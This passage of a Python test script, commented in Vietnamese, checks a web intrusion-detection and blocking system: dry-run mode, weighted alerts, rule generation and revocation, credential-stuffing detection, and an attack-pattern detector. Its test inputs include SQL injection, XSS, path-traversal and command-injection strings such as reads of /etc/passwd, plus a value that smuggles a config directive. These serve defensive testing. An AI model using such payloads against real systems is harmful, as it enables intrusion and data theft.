      and any("bị chặn 3, lọt 1" in l for l in SC.tool_md("y", _w)))
_runs = [{"actor": 0, "sent": [{"k": 0, "fam": "sqli", "place": "query", "ev": "-", "gate": "pass"}]},
         {"actor": 1, "sent": [{"k": 0, "fam": "benign", "place": "query", "ev": "-", "gate": "pass"}]}]
_obs = {"web": [{"source": "web", "ua": "x nsm-sc/r/s/0/0", "label": "sqli"}, {"source": "web", "ua": "x nsm-sc/r/s/1/0", "label": "benign"}]}
_m = SC.matrix_table(_runs, _obs)
check("ma trận ghép theo (tác nhân, số thứ tự): nhãn của tác nhân này không đè tác nhân khác",
      _m["sqli|query|-"]["clf"] == 1 and _m["benign|query|-"]["clf"] == 0, str(_m))

# =====================================================================  đợt 15/11/2026
print("== responder: chế độ chạy thử (dryrun) — ghi 'sẽ chặn', không gửi lệnh chặn")
R.state["blocks"].clear(); R.state["would"].clear(); R.hits.clear(); R.hits2.clear(); R.seen.clear()
clock[0] = 4_000_000.0
R.time.time = lambda: clock[0]          # các mục phía trên đã đổi đồng hồ chung (module time dùng chung giữa các dịch vụ)
d = ctl("mode", mode="dryrun")
check("nsmctl mode dryrun có hiệu lực và được ghi kiểm toán", d["decision"] == "mode" and d["mode"] == "dryrun" and R.mode() == "dryrun", str(d))
n_pub = len(R.prod.msgs)
dec = [alert("10.10.10.190", target=f"/d?id={i}' union select 1") for i in range(5)]
check("đủ ngưỡng -> would_block với đủ trường như block",
      dec[-1]["decision"] == "would_block" and dec[-1]["reason"] == "threshold" and dec[-1]["ttl_s"] == 900
      and dec[-1]["offenses"] == 1 and "expires" in dec[-1], str(dec[-1]))
check("chạy thử: không có lệnh chặn nào được gửi", len(R.prod.msgs) == n_pub and "10.10.10.190" not in R.state["blocks"])
d = alert("10.10.10.190", target="/d?id=9' union select 1")
check("chạy thử: cảnh báo tiếp theo được xử như khi đã chặn", d["decision"] == "skip" and d["reason"] == "would_already_blocked", str(d))
d = ctl("mode", mode="enforce")
check("về enforce: xoá lệnh chặn ảo, không biến thành lệnh chặn thật",
      R.mode() == "enforce" and not R.state["would"] and "10.10.10.190" not in R.state["blocks"] and d["would_cleared"] == 1, str(d))
dec = [alert("10.10.10.190", target=f"/e?id={i}' union select 1") for i in range(5)]
check("enforce: chặn thật như trước", dec[-1]["decision"] == "block" and R.state["blocks"]["10.10.10.190"]["active"], str(dec[-1]))
d = ctl("mode", mode="xyz")
check("giá trị chế độ lạ bị từ chối", d["decision"] == "ctl_reject" and R.mode() == "enforce", str(d))
check("lệnh rule_* (của rulegen) bị responder bỏ qua, không ghi 'unknown_command'",
      R.control({"cmd": "rule_revoke", "id": "t9", "ts": clock[0], "rule_id": 1}) is None and R.es_buf.docs[-1].get("ctl_id") != "t9")

print("== responder: cảnh báo nửa trọng số của tầng 2 (chế độ weighted)")
clock[0] += 200000
dec = [alert("10.10.10.191", target=f"/w?q={i}", weighted=True, tier=2) for i in range(9)]
check("9 cảnh báo nửa trọng số (4,5 điểm) chưa đủ ngưỡng 5", all(d["decision"] == "count" for d in dec), str([d["decision"] for d in dec]))
d = alert("10.10.10.191", target="/w?q=10", weighted=True, tier=2)
check("10 cảnh báo CHỈ nửa trọng số -> vẫn không khoá (T2_SOLO_BLOCK=0), ghi rõ tier2_only",
      d["decision"] == "count" and "tier2_only" in d["reason"], str(d))
R.T2_SOLO_BLOCK = True
d = alert("10.10.10.191", target="/w?q=11", weighted=True, tier=2)
check("T2_SOLO_BLOCK=1: cảnh báo nửa trọng số thứ 11 -> chặn, lý do ghi rõ có tầng 2", d["decision"] == "block" and "tier2" in d["reason"], str(d))
R.T2_SOLO_BLOCK = False
clock[0] += 200000
for i in range(3): alert("10.10.10.192", target=f"/m?id={i}' union select 1")
dec = [alert("10.10.10.192", target=f"/m?q={i}", weighted=True) for i in range(4)]
check("3 cảnh báo thường + 4 nửa trọng số = 5 điểm -> chặn ở cảnh báo cuối",
      dec[-1]["decision"] == "block" and dec[-2]["decision"] == "count", str([d["decision"] for d in dec]))
clock[0] += 200000
dec = []
for i in range(30):
    dec.append(alert("10.10.10.193", target=f"/l?q={i}", weighted=True)); clock[0] += 600
check("nửa trọng số KHÔNG tính vào cửa sổ dài (30 lần rải trong 5 giờ không bị chặn)",
      all(d["decision"] == "count" for d in dec), str([d["decision"] for d in dec][-3:]))
d = alert("10.10.10.194", cls="sqli", immediate=True, weighted=True)
check("cảnh báo nửa trọng số không bao giờ khoá ngay", d["decision"] == "count", str(d))

print("== classifier: chế độ tầng 2 'weighted', thang độ tin cậy, bản lưu tấn công")
_saved = (C.T2_MODE, C.T2_THRESHOLD, C.tier2)
C.T2_THRESHOLD = 0.67
check("điểm model đúng ngưỡng -> 0,90; điểm 1,0 -> 1,0; ở giữa thì nằm giữa",
      C.t2_confidence(0.67) == 0.9 and C.t2_confidence(1.0) == 1.0 and 0.9 < C.t2_confidence(0.8) < 1.0)
C.tier2 = lambda ev, gate_text=None: ("sqli", 0.8, ["uni", "sel"])
_ev = lambda **kw: {"query": "q=hello", "body": "", "uri": "/s", **kw}
C.T2_MODE = "weighted"
r = C.classify("/s", [("q", "hello")], [], "Mozilla/5.0", _ev())
check("weighted + Cổng 2 KHÔNG chặn -> dùng nhãn tầng 2, có cờ weighted, độ tin cậy >= 0,9, giữ điểm gốc",
      r["label"] == "sqli" and r["tier"] == 2 and r.get("weighted") is True and r["conf"] >= 0.9 and r["t2_conf"] == 0.8, str(r))
r = C.classify("/s", [("q", "hello")], [], "Mozilla/5.0", _ev(_waf_blocked=True))
check("weighted + Cổng 2 CŨNG chặn -> tính đủ (không có cờ weighted)", r["label"] == "sqli" and "weighted" not in r, str(r))
C.T2_MODE = "corroborate"
r = C.classify("/s", [("q", "hello")], [], "Mozilla/5.0", _ev())
check("corroborate + Cổng 2 không chặn -> vẫn lành tính, nhãn model chỉ ghi nhận", r["label"] == "benign" and r["t2_label"] == "sqli", str(r))
C.T2_MODE, C.T2_THRESHOLD, C.tier2 = _saved
class _IdxBuf:
    def __init__(self): self.idx = []
    def add(self, idx, doc, _id=None): self.idx.append(idx.split("-20")[0])
_b = _IdxBuf()
C.store_event(_b, 1794214800.0, {"label": "sqli"}); C.store_event(_b, 1794214800.0, {"label": "benign"})
check("sự kiện tấn công được ghi thêm một bản vào attack-events-* (lưu 1 năm); lành tính thì không",
      _b.idx == ["web-events", "attack-events", "web-events"], str(_b.idx))

print("== rulegen: áp dụng ngay, gỡ luật, cấm sinh lại, tự gỡ khi khớp nguồn sạch (hướng D)")
class FakeES2(FakeES):
    def __init__(self):
        super().__init__(); self.audits = []; self.err_hits = {}; self.clean = set()
    def index(self, index, document, id=None):
        if index.startswith("audit-decisions"): self.audits.append(document)
        else: self.indexed[id] = document
    def search(self, **k):
        if k.get("index") == "apache-errors-*":
            return {"aggregations": {"r": {"buckets": [
                {"key": str(rid), "ip": {"buckets": [{"key": ip, "n": {"value": n}} for ip, n in ips.items()]}}
                for rid, ips in self.err_hits.items()]}}}
        if "ok" in ((k.get("aggs") or {}).get("ips") or {}).get("aggs", {}):          # clean_sources
            return {"aggregations": {"ips": {"buckets": [{"key": ip, "doc_count": 50, "ok": {"doc_count": 50},
                                                         "bad": {"doc_count": 0}} for ip in self.clean]}}}
        return super().search(**k)
_gsaved = (G.es, G.SELECTOR, G.APPLY, G.g2r)
fes2 = FakeES2(); G.es = fes2; G.SELECTOR = "g0"; G.APPLY = "immediate"
published.clear()
G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
fes2.events = attack_events + [web("10.10.10.20", "benign", [("id", "laptop"), ("submit", "submit")])] * 150
fes.events = fes2.events                 # fake_scan (ở trên) đọc sự kiện từ fes
G.cycle()
rules = list(G.state["rules"].values())
check("áp dụng ngay: luật mới CHẶN luôn, có hạn sống và lệnh gỡ",
      len(rules) == 1 and rules[0]["state"] == "active" and rules[0]["reason"] == "new_cluster_immediate"
      and "deny,status:403" in published[-1] and "rule-revoke" in rules[0].get("revoke_cmd", "")
      and abs(rules[0]["expires"] - G.time.time() - G.RULE_TTL) < 5, str(rules))
rid = rules[0]["id"]
check("lệnh gỡ quá cũ bị bỏ", G.control({"cmd": "rule_revoke", "id": "c0", "ts": G.time.time() - 3600, "rule_id": rid}) == "ctl_reject"
      and rules[0]["state"] == "active")
check("gỡ mã luật không tồn tại bị từ chối", G.control({"cmd": "rule_revoke", "id": "c0", "ts": G.time.time(), "rule_id": 1}) == "ctl_reject")
r_ = G.control({"cmd": "rule_revoke", "id": "c1", "ts": G.time.time(), "rule_id": rid})
check("nsmctl rule-revoke: gỡ ngay, phát lại tệp luật không còn luật đó, có kiểm toán kèm mã lệnh",
      r_ == "rule_revoke" and rules[0]["state"] == "revoked" and rules[0]["reason"] == "manual" and "deny" not in published[-1]
      and any(a["decision"] == "rule_revoke" and a.get("ctl_id") == "c1" and a["rule_id"] == rid for a in fes2.audits), str(fes2.audits[-1:]))
check("lệnh không phải rule_* thì rulegen bỏ qua", G.control({"cmd": "unblock", "id": "c2", "ts": G.time.time(), "ip": "1.2.3.4"}) is None)
G.cycle()
check("luật vừa gỡ KHÔNG bị sinh lại trong thời gian cấm", len(G.state["rules"]) == 1, str(list(G.state["rules"])))
G.state["banned"].clear()
G.cycle()
rules = [r for r in G.state["rules"].values() if r["state"] == "active"]
check("hết thời gian cấm -> sinh lại được", len(rules) == 1 and rules[0]["id"] == rid + 1, str(list(G.state["rules"])))
r2 = rules[0]
fes2.err_hits = {r2["id"]: {"10.10.9.9": 7}}; fes2.clean = set()
G.cycle()
check("luật chỉ khớp nguồn KHÔNG có lịch sử sạch (kẻ tấn công đổi IP) -> giữ, ghi số lần khớp thật",
      r2["state"] == "active" and r2.get("hits_real") == 7, str(r2))
fes2.err_hits = {r2["id"]: {"10.10.9.9": 7, "10.10.10.20": 3}}; fes2.clean = {"10.10.10.20"}
G.cycle()
check("luật chặn 3 request của nguồn sạch có tiếng -> TỰ GỠ, có kiểm toán, bị cấm sinh lại",
      r2["state"] == "revoked" and r2["reason"] == "benign_hit_live" and G.banned(G.ban_key(r2))
      and any(a["decision"] == "rule_revoke" and a["reason"] == "benign_hit_live" and a["benign_hits"] == 3 for a in fes2.audits), str(r2))
G.state["banned"].clear(); fes2.err_hits = {}; fes2.clean = set()
G.cycle()
r3 = [r for r in G.state["rules"].values() if r["state"] == "active"][0]
r3["expires"] = G.time.time() - 1; r3["last_hit"] = G.time.time() - 60
G.cycle()
check("hết hạn nhưng vừa chặn được tấn công -> tự gia hạn", r3["state"] == "active" and r3["reason"] == "ttl_extended"
      and r3["expires"] > G.time.time() and r3.get("extended") == 1, str(r3))
r3["expires"] = G.time.time() - 1; r3["last_hit"] = G.time.time() - G.REVOKE - 60; r3["since"] = r3["last_hit"]
fes2.events = [web("10.10.10.20", "benign", [("id", "laptop"), ("submit", "submit")])] * 150      # không còn tấn công
fes.events = fes2.events
G.cycle()
check("hết hạn và không còn khớp gì -> hết hiệu lực", r3["state"] in ("expired", "revoked"), str(r3["state"]))
_cov1 = [{"ip": "10.0.0.1", "weighted": True}] * 5
_cov2 = [{"ip": f"10.0.0.{i % 2}", "weighted": True} for i in range(5)]
check("cụm đa số do tầng 2 gắn nhãn: nhận ra đúng", G.is_t2_cluster(_cov1) and not G.is_t2_cluster([{"ip": "x", "weighted": False}] * 5))
check("cụm tầng 2 từ MỘT IP không sinh được luật", not G.t2_cluster_ok({"op": "contains", "tokens": ["' union"]}, _cov1))
check("cụm tầng 2 từ 2 IP + token có cú pháp tấn công -> được", G.t2_cluster_ok({"op": "contains", "tokens": ["' union"]}, _cov2))
check("cụm tầng 2: token toàn chữ thường ('select a laptop') bị loại", not G.t2_cluster_ok({"op": "contains", "tokens": ["select a "]}, _cov2))
G.es, G.SELECTOR, G.APPLY, G.g2r = _gsaved

print("== giới hạn tốc độ ở Cổng 1: miễn trừ đi tới nginx, tầng 3 thấy request bị 429")
R.publish_blocklist()
check("responder gửi kèm danh sách miễn trừ trong enforce.blocklist",
      "10.10.30.0/24" in R.prod.msgs[-1][2].get("exempt", []) and "172.16.0.0/12" in R.prod.msgs[-1][2]["exempt"], str(R.prod.msgs[-1][2].get("exempt")))
_written = {}
_fa = F.atomic_write; F.atomic_write = lambda path, body: _written.__setitem__(path, body)
F.last_ts["blocklist"] = 0.0
F.write_blocklist({"ips": ["10.10.10.66"], "fps": [], "exempt": ["10.10.30.0/24", "10.10.10.240/29", "x; include /etc/passwd"], "ts": 5e9}, FakeProd())
check("enforcer ghi exempt.geo đúng dạng '<dải> 1;' và bỏ mục không hợp lệ",
      _written.get(F.EXEMPT_PATH, "").splitlines()[1:] == ["10.10.10.240/29 1;", "10.10.30.0/24 1;"], repr(_written.get(F.EXEMPT_PATH)))
F.atomic_write = _fa
g = T.gate_event({"ts": 1794214800.5, "src_ip": "10.10.10.77", "method": "POST", "uri": "/login.php?x=1", "status": 429, "ua": "curl"})
check("dòng 429 của gate1.logs đổi đúng sang dạng sự kiện web", g and g["status"] == 429 and g["uri"] == "/login.php"
      and g["query"] == "x=1" and abs(g["ts_ms"] - 1794214800500.0) < 1, str(g))
check("403 của Cổng 1 (IP đã bị chặn) không đưa vào tầng 3", T.gate_event({"ts": 1.0, "src_ip": "1.2.3.4", "status": 403}) is None)
_d = {"n_req": 60, "frac_404": 0.0, "frac_post": 0.0, "uniq_uri": 5, "uniq_q_ratio": 0.1}
check("mẫu hành vi 'ratelimit': 40/60 request bị 429", T.attack_shape(_d, {"n404": 0, "ndeny": 0, "npost": 0, "n429": 40}) == "ratelimit")
check("vài request bị 429 (5/60) chưa phải mẫu tấn công", T.attack_shape(_d, {"n404": 0, "ndeny": 0, "npost": 0, "n429": 5}) is None)

print("== luật tầng 1 'rất chắc' (D5): cờ strong, 2 cảnh báo là chặn")
check("đọc được danh sách luật rất chắc từ models/tier1_strong.json", len(C.STRONG_PATTERNS) >= 5, str(len(C.STRONG_PATTERNS)))
r = C.classify("/x", [("id", "1 union select 1,2")], [], "Mozilla/5.0", {"query": "id=1", "body": "", "uri": "/x"})
check("UNION SELECT (0 lần khớp nhầm trên 750 000 request thật) -> strong", r.get("strong") is True, str(r))
r = C.classify("/x", [("cb", "javascript:alert(1)")], [], "Mozilla/5.0", {"query": "cb=1", "body": "", "uri": "/x"})
check("javascript: (có khớp nhầm trên lưu lượng thật) -> không strong", r["label"] == "xss" and not r.get("strong"), str(r))
clock[0] += 300000
check("mặc định STRONG_WEIGHT = 1 (tắt, 15/11)", R.STRONG_WEIGHT == 1.0, str(R.STRONG_WEIGHT))
d1 = alert("10.10.10.196", target="/s?id=1 union select 1", strong=True)
d2 = alert("10.10.10.196", target="/s?id=2 union select 2", strong=True)
check("STRONG_WEIGHT = 1: 2 cảnh báo strong chưa chặn", d1["decision"] == "count" and d2["decision"] == "count", str(d2))
R.STRONG_WEIGHT = 2.5
d1 = alert("10.10.10.195", target="/s?id=1 union select 1", strong=True)
d2 = alert("10.10.10.195", target="/s?id=2 union select 2", strong=True)
check("2 cảnh báo strong -> chặn (lý do ghi rõ)", d1["decision"] == "count" and d2["decision"] == "block" and "strong" in d2["reason"], str(d2))
clock[0] += 300000
dd = [alert("10.10.10.196", target=f"/s?q={i}") for i in range(4)]
check("cảnh báo thường vẫn cần 5", all(x["decision"] == "count" for x in dd), str([x["decision"] for x in dd]))
R.STRONG_WEIGHT = 1.0

print("== tier3: chiến dịch nhồi tài khoản phân tán (nhiều IP, mỗi IP vài lần đăng nhập)")
def run_campaign(n_ips, per_ip, t0=5_000_000.0, status=302, uri="/login.php", method="POST"):
    T.st.clear(); T.login_ev.clear(); T.camp.update(last_alert={}, since=0, last_eval=0.0, max_ts=0.0)
    buf, prod = FakeBuf(), FakeProd()
    T.time.time = lambda: t0 + 30
    k = 0
    for r_ in range(per_ip):
        for i in range(n_ips):
            T.add({"src_ip": f"10.10.12.{i + 1}", "ts_ms": (t0 + k * 0.05) * 1000, "uri": uri, "status": status,
                   "method": method, "query": "", "ua": "curl/8"}, prod, buf); k += 1
    T.campaign(prod, buf, force=True)
    return [m_[2] for m_ in prod.msgs if m_[2].get("shape") == "stuffing"]
al = run_campaign(50, 4)
check("50 IP × 4 lần POST đăng nhập -> cả 50 IP bị báo (mẫu 'stuffing', khoá ngay)",
      len({a["src_ip"] for a in al}) == 50 and all(a.get("immediate") for a in al), str(len(al)))
check("mỗi IP chỉ bị báo một lần trong thời gian chờ", len(al) == 50, str(len(al)))
check("5 người cùng gõ sai mật khẩu vài lần KHÔNG phải chiến dịch", run_campaign(5, 4) == [])
check("100 người mỗi người đăng nhập 1–2 lần (cao điểm hợp lệ) KHÔNG bị báo", run_campaign(100, 2) == [])
al = run_campaign(20, 3, status=401, uri="/api.php")
check("API trả 401 (sai mật khẩu) cũng được tính là lần thử đăng nhập", len({a["src_ip"] for a in al}) == 20, str(len(al)))

print("== constructs: cấu trúc tấn công rõ, và cổng cấu trúc của tầng 2 (TIER2_CONSTRUCT_GATE, 16/11/2026)")
import constructs as K
for v in ("1' UNION SELECT user,password FROM users-- -", "x&sleep$mc 15&", "+|+dir+c:/", "1.2.3 ASC  -- ", "..../0x2f..../0x2fetc0x2fpasswd",
          "<img src=x onerror=alert(1)>", ";cat /etc/passwd", "admin'--", "`id`"):
    check(f"có cấu trúc tấn công: {v!r}", bool(K.constructs(v)))
for v in ("order by price", "select a laptop for school", "ls", "dir", "true or false", "1=1", "C# and C++", "4.2.6'", "delete",
          "laptop gaming 15 inch", "Nguyễn Văn An", "rock 'n' roll", "50% off today", ""):
    check(f"KHÔNG có cấu trúc tấn công: {v!r}", not K.constructs(v))
# bộ bổ sung v2 (TIER2_CONSTRUCT_RULES=2): bộ gốc KHÔNG khớp, v2 khớp
for v in ("') or ('a'='a", "1 and left(version(),1)=4", "' || myappadmin.adduser('admin', 'newpass') || '", "exec master..xp_cmdshell 'net users'",
          "1' ORDER BY 1,2,3--+", "select current_setting('config_file');", "\nid", "\n/usr/bin/id\n", "; netstat -an", "ipconfig /all",
          ";phpinfo();//", "Li4vLi4vLi4vZXRjL3Bhc3N3ZA==", "..2f..2f..2fvar2flog2faccess.log", "/var/log/apache/error.log", "/usr/local/php5/lib/php.ini",
          "&#x00003c", "&lt;A HREF=&quot;http://www.google.com&quot;&gt;XSS&lt;/A&gt;", "confirm?.(document?.cookie)", "<iframe src=http://x.test/a.html <"):
    check(f"v2 thêm: bộ gốc không khớp, bộ bổ sung khớp: {v!r}", not K.constructs(v, "1") and bool(K.constructs(v, "2")))
# bộ bổ sung vẫn hẹp: các chuỗi hợp lệ dễ nhầm này KHÔNG được khớp
for v in ("ifconfig", "ipconfig", "ls", "id", "D:\\photos\\2025", "The students' union runs a bar on campus.", "order by 12 March", "order by price",
          "select a laptop for school", "true or false", "Tom and Jerry", "&#272;&#224; N&#7861;ng", "union", "delete", "50% off today",
          "ping", "netstat", "a || b", "/home/dashboard", "report.log"):
    check(f"v2 KHÔNG khớp: {v!r}", not K.constructs(v, "2"))
check("mặc định dùng bộ gốc (TIER2_CONSTRUCT_RULES chưa đặt)", K.RULESET == "1" or bool(os.environ.get("TIER2_CONSTRUCT_RULES")))
check("xét TỪNG giá trị: chú thích SQL ở cuối một giá trị vẫn được thấy dù còn tham số khác", K.any_construct(["hello", "7 asc  -- ", "1"]))
check("giá trị dài bị cắt ở 2 000 ký tự (không quét vô hạn)", not K.constructs("a" * 2500 + "<script>alert(1)</script>"))
_t2, _con, _mode = C.tier2, C.T2_CONSTRUCT, C.T2_MODE
C.tier2 = lambda ev, gate_text=None: ("sqli", 0.99, ["sele"])      # giả lập: model LUÔN gắn nhãn sqli
C.T2_MODE = "weighted"
C.T2_CONSTRUCT = False
r = cls("/search.php", "q=order+by+price")
check("cổng cấu trúc TẮT: nhãn của model được dùng như trước", r["label"] == "sqli" and r.get("weighted") is True, str(r))
C.T2_CONSTRUCT = True
r = cls("/search.php", "q=order+by+price")
check("cổng BẬT, văn bản không có cấu trúc: nhãn benign; nhãn của model chỉ được ghi lại (t2_gated)",
      r["label"] == "benign" and r.get("t2_label") == "sqli" and r.get("t2_gated") == "construct", str(r))
r = cls("/search.php", "q=7+ASC++--+")
check("cổng BẬT, giá trị có cấu trúc: nhãn của model được dùng (tầng 2, nửa trọng số)",
      r["label"] == "sqli" and r.get("tier") == 2 and r.get("weighted") is True and "t2_gated" not in r, str(r))
r = cls("/search.php", "a=hello&q=7+ASC++--+&b=1")
check("cổng BẬT: cấu trúc ở tham số GIỮA vẫn được thấy", r["label"] == "sqli" and r.get("tier") == 2, str(r))
r = cls("/login.php", "", "username=admin&password=password")
check("cổng BẬT: form đăng nhập thường (thân POST) không còn bị gắn nhãn", r["label"] == "benign", str(r))
C.tier2, C.T2_CONSTRUCT, C.T2_MODE = _t2, _con, _mode

print()
if FAILS:
    print(f"THẤT BẠI {len(FAILS)} mục:"); [print("  -", f) for f in FAILS]; sys.exit(1)
print("TẤT CẢ ĐỀU ĐẠT")
